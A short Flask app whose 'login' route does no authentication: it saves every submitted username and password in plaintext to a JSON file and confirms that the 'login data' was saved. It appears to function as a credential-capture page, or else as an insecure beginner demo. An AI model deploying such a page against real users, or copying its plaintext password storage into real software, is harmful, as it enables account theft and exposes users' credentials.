from flask import Flask, render_template, request, redirect
import json
import os

app = Flask(__name__)

DATA_FILE = 'data.json'

# Create the data file if not exists
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump([], f)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        new_user = {
            'username': username,
            'password': password
        }

        with open(DATA_FILE, 'r+') as f:
            data = json.load(f)
            data.append(new_user)
            f.seek(0)
            json.dump(data, f, indent=4)

        return redirect('/success')

    return render_template('login.html')

@app.route('/success')
def success():
    return "<h2>Login data saved successfully!</h2>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
